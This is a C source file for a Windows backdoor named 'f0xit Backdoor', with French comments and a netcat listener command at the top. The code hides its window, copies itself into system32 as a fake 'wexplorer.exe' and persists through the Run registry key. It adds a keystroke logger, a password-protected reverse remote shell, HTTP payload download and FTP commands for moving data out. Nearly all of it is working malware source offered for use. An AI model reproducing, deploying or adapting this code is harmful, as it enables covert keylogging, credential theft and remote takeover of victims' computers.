/* nc -L -vv -p 3615 to use this backdoor */
#include <stdlib.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <Wininet.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Wininet.lib")
#define TAILLE_MAX 256
#define SIZE 1024
// Global instance du hook
HHOOK hKeyHook;
// Gestion du hook
__declspec(dllexport) LRESULT CALLBACK KeyEvent (int nCode, WPARAM wParam, LPARAM lParam ) {
// Action du clavier et les touches tappées
    if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN)) {
// conversion du code -> ascii
        BYTE KeyState[256];
        WORD wBuf;
        char ch;
// Structure pour récupération des informations
        KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*)lParam);
/* Traitement récupération dec codes des touches */
// Etat du clavier
        GetKeyboardState(KeyState);
        FILE* keyloggfile = NULL;
        char keyloggname[256];
        GetSystemDirectory( keyloggname, sizeof(keyloggname));
        strcat(keyloggname,"\\sys32-log.dat");
        keyloggfile=fopen(keyloggname,"a");
        if (keyloggfile != NULL)
        {
            // Conversion code > ascii
            ToAscii(hooked.vkCode, hooked.scanCode ,KeyState,&wBuf,0);
    //on rajoute les touches non traitées par le hook
            switch(hooked.vkCode){
            case 9 :{fputs("<TAB>", keyloggfile);break;}
            case 13 :{fputs("<ENTER>", keyloggfile);break;}
            case VK_BACK :{fputs("<delete>", keyloggfile);break;}
            case VK_DELETE: {fputs("<Suppr>", keyloggfile);break;}
            fclose(keyloggfile);
    /* vous pouvez rajouter vos traitements perso ici ! */
            default : { // on affiche les touches tappées
            ch=((char)wBuf);
            fprintf(keyloggfile, "%c", ch);
            fclose(keyloggfile);
            break;
            }
        }
        }
}
// Renvoi des messages au sytème
return CallNextHookEx(hKeyHook, nCode,wParam,lParam);
}
// Boucle des messages
void MsgLoop()
{
    MSG message;
    while (GetMessage(&message,NULL,0,0)) {
        TranslateMessage( &message );
        DispatchMessage( &message );
    }
}
DWORD WINAPI KeyLogger(LPVOID lpParameter)
{
// Récuperation de l'instance de notre executable
    HINSTANCE hExe = GetModuleHandle(NULL);
    if (!hExe) return 1;
// on demarre le hook
    hKeyHook = SetWindowsHookEx (WH_KEYBOARD_LL,(HOOKPROC) KeyEvent,hExe, NULL);
    if(hKeyHook==NULL)
        printf("[le hook clavier a plante !]\n");
    else
        printf("[hook clavier en cours ...]\n");
// Boucle des messages
    MsgLoop();
}
int main()
{
    // Permet de cacher la fenêtre
    HWND hwnd;
    CHAR ConsoleTitle[128];
    GetConsoleTitle(ConsoleTitle, sizeof(ConsoleTitle));
    hwnd = FindWindow(NULL, ConsoleTitle);
    ShowWindow(hwnd, SW_HIDE);

    // variables etc..
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);
    SOCKET sock;
    SOCKADDR_IN sin;
    int flag;
    char download[9]="download";
    char realpass[7]="r00ted";
    char exit [5]="exit";
    char keylogg[256]="keylogger";
    char ftp[256]="!ftp";
    char desinfect[256]="!desinfect";
    char quiftp[256]="quit";
    char help[256]="!help";
    char passw0rd [256];
    char commande [256];
    char lpMdFileName [256];
    char kdsk[256];
    char lpSystemDir[256];
    char szURL[256];
    char chaine[TAILLE_MAX] = "";
    char nameoffile[256];
    char destftp[256];
    char userftp[256];
    char passftp[256];
    char cmdftp[256];
    char * pFile;
    char *mem = (char *)malloc(SIZE);
    int length;
    int i;
    DWORD dwFileSize = 0, dwByteRead = 0;
    DWORD dwContext = 0;
    HINTERNET hSession, hUrl;

    // auto-création dans system32
    GetSystemDirectory( lpSystemDir, sizeof(lpSystemDir));
    strcat(lpSystemDir,"\\wexplorer.exe");
    FILE* fichier = NULL;
    if( (fichier=fopen(lpSystemDir,"rb"))==NULL )
    {
        FILE* fichier = NULL;
        FILE* fichier2 = NULL;
        GetModuleFileName( NULL, lpMdFileName, sizeof(lpMdFileName ) );
        fichier2 = fopen(lpMdFileName, "rb");
        fichier = fopen(lpSystemDir, "wb");
        while((length = fread(mem,1,SIZE,fichier2)) != 0)
        {
            fwrite(mem,1,length,fichier);
        }
        fclose(fichier);
        fclose(fichier2);
    }

    // création de la clé dans le registre
    HKEY hKey;
    if( RegOpenKeyEx( HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,KEY_ALL_ACCESS,&hKey ) == ERROR_SUCCESS )
    {
        if( RegSetValueEx(hKey,"wexplorer",0,REG_SZ,(CONST BYTE*)"%HOMEDRIVE%\\WINDOWS\\system32\\wexplorer.exe",46) == ERROR_SUCCESS )
        RegCloseKey( hKey );
    }
    while(1)
    {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        sin.sin_addr.s_addr = inet_addr("127.0.0.1");
        sin.sin_family = AF_INET;
        sin.sin_port = htons(3615);
        connect(sock, (SOCKADDR *)&sin, sizeof(sin));
        send(sock, "Remote Shell\n", 14, 0);
        send(sock, "What's the passw0rd? ", 21, 0);
        memset (passw0rd, '\0', sizeof (passw0rd));
        recv(sock, passw0rd, sizeof(passw0rd), 0);
        passw0rd[strlen(passw0rd)-1] = '\0';
        if (!strcmp(passw0rd, realpass))
        {
            flag = 1;
            while(flag)
            {
                send(sock, ":/> ", 4, 0);
                memset (commande, '\0', sizeof (commande));
                recv(sock, commande, sizeof(commande), 0);
                commande[strlen(commande)-1] = '\0';

                // met fin au programme
                if (!strcmp(commande, exit))
                {
                    send(sock, "Shell Finished n0w", 18, 0); // affiche du texte
                    closesocket(sock);
                    flag = 0;
                }

                // desinfect
                if (!strcmp(commande, desinfect))
                {
                    send(sock, "Trying to desinfect...", 22, 0);
                    HKEY hKey;
                    system("echo @echo off > %SYSTEMROOT%\\system32\\dis.bat");
                    system("echo del %SYSTEMROOT%\\system32\\sys32-log.dat >> %SYSTEMROOT%\\system32\\dis.bat");
                    system("echo reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v wexplorer /f >> %SYSTEMROOT%\\system32\\dis.bat");
                    system("echo del %SYSTEMROOT%\\system32\\wexplorer.exe >> %SYSTEMROOT%\\system32\\dis.bat");
                    system("echo del %0 >> %SYSTEMROOT%\\system32\\dis.bat");
                    if( RegOpenKeyEx( HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,KEY_ALL_ACCESS,&hKey ) == ERROR_SUCCESS )
                    {
                        if( RegSetValueEx(hKey,"wexplorer",0,REG_SZ,(CONST BYTE*)"%HOMEDRIVE%\\WINDOWS\\system32\\dis.bat",46) == ERROR_SUCCESS )
                        RegCloseKey( hKey );
                    }
                    return 0;
                }

                // module pour l'aide
                if (!strcmp(commande, help))
                {
                    send(sock, "f0xit Backdoor\n", 16, 0);
                    send(sock, "Commands :\n", 12, 0);
                    send(sock, "Shell commands, like a Win32 command prompt\n", 45, 0);
                    send(sock, "download ; download file from internet (http)\n", 47, 0);
                    send(sock, "keylogger ; can have touchs wich are press on sys32-log.dat (sys. dir)\n", 72, 0);
                    send(sock, "!ftp ; can execute ftp command (only one per time)\n", 52, 0);
                    send(sock, "!desinfect ; desinfect victim with a .bat file, logs too\n", 58, 0);
                    send(sock, "exit ; used to quit and stop connection, server wait 3 minutes before next connection\n", 87, 0);
                }

                // module pour le keylogger
                if (!strcmp(commande, keylogg))
                {
                    send(sock, "Keylogger is launched\n", 23, 0);
                    HANDLE hThread;
                    DWORD dwThread;
                    DWORD exThread;
                    // on crée le thread qui va démarrer le hook
                    hThread = CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE) KeyLogger, (LPVOID)NULL, NULL, &dwThread);
                }

                // module pour le ftp
                if (!strcmp(commande, ftp))
                {
                    send(sock, "Starting FTP\n", 14, 0);
                    send(sock, "Enter host :", 12, 0);
                    memset (destftp, '\0', sizeof (destftp));
                    recv(sock, destftp, sizeof(destftp), 0);
                    send(sock, "User and pass (ex: root pass):", 30, 0);
                    memset (userftp, '\0', sizeof (userftp));
                    recv(sock, userftp, sizeof(userftp), 0);
                    send(sock, "Command :", 9, 0);
                    memset (cmdftp, '\0', sizeof (cmdftp));
                    recv(sock, cmdftp, sizeof(cmdftp), 0);
                    FILE* fichier = NULL;
                    fichier = fopen("ftp.txt", "w");
                    fprintf(fichier, "open %s", destftp);
                    fprintf(fichier, "user %s", userftp);
                    fprintf(fichier, "%s", cmdftp);
                    fprintf(fichier, "%s", quiftp);
                    fclose(fichier);
                    system("ftp -n -i -s:ftp.txt > %SYSTEMROOT%\\system32\\win32.dll");
                    remove("ftp.txt");
                    GetSystemDirectory( kdsk, sizeof(kdsk));
                    strcat(kdsk,"\\win32.dll");
                    fichier = fopen(kdsk, "r"); // ouvre le fichier
                    if (fichier != NULL) // si c'est pas nul.
                    {
                        while (fgets(chaine, TAILLE_MAX-2, fichier) != NULL)// On lit le fichier tant qu'on ne reçoit pas d'erreur (NULL)
                        {
                            strcat (chaine, "\r");
                            send(sock, chaine, strlen(chaine), 0); // On envoie la chaîne qu'on vient de lire
                        }
                        fclose(fichier);
                    }

                }


                // module de download de fichiers utilisant le protocole http
                if (!strcmp(commande, download))
                {
                    send(sock, "Please, enter url of file : ", 28, 0);
                    memset (szURL, '\0', sizeof (szURL));
                    recv(sock, szURL, sizeof(szURL), 0);
                    send(sock, "Please, enter name of the dest. file : ", 39, 0);
                    memset (nameoffile, '\0', sizeof (nameoffile));
                    recv(sock, nameoffile, sizeof(nameoffile), 0);
                    nameoffile[strlen(nameoffile)-1] = '\0';
                    hSession = InternetOpen("test", INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
                    if(hSession == NULL) return 0;
                    hUrl = InternetOpenUrl(hSession, szURL, 0, 0, INTERNET_FLAG_EXISTING_CONNECT, (DWORD_PTR)&dwContext);
                    if(hUrl == NULL) return 0;
                    FILE* fichier = NULL;
                    fichier = fopen(nameoffile, "wb");
                    InternetQueryDataAvailable(hUrl, &dwFileSize, 0, (DWORD_PTR)&dwContext);
                    pFile = (char*)malloc(dwFileSize+1);
                    pFile[dwByteRead] = 0;
                    memset(pFile, 0, dwFileSize);
                    if (fichier != NULL)
                    {
                        while(InternetReadFile(hUrl, pFile, dwFileSize, &dwByteRead)==TRUE && dwByteRead>0)
                        {
                            fwrite(pFile, 1, dwByteRead, fichier);
                        }
                    fclose(fichier);
                    }
                }
                else
                {
                    strcat (commande, " > %SYSTEMROOT%\\system32\\win32.dll");
                    system(commande);
                    GetSystemDirectory( kdsk, sizeof(kdsk));
                    strcat(kdsk,"\\win32.dll");
                    fichier = fopen(kdsk, "r"); // ouvre le fichier
                    if (fichier != NULL) // si c'est pas nul.
                    {
                        while (fgets(chaine, TAILLE_MAX-2, fichier) != NULL)// On lit le fichier tant qu'on ne reçoit pas d'erreur (NULL)
                        {
                            strcat (chaine, "\r");
                            send(sock, chaine, strlen(chaine), 0); // On envoie la chaîne qu'on vient de lire
                        }
                        fclose(fichier);
                    }
                }
            }
        }
        // si le pass est ps bon
        else
        {
            send(sock, "Go Away Dude ;)", 15, 0);
            closesocket(sock);
        }
        // attend 3 minutes
        Sleep(180000);
    }
}
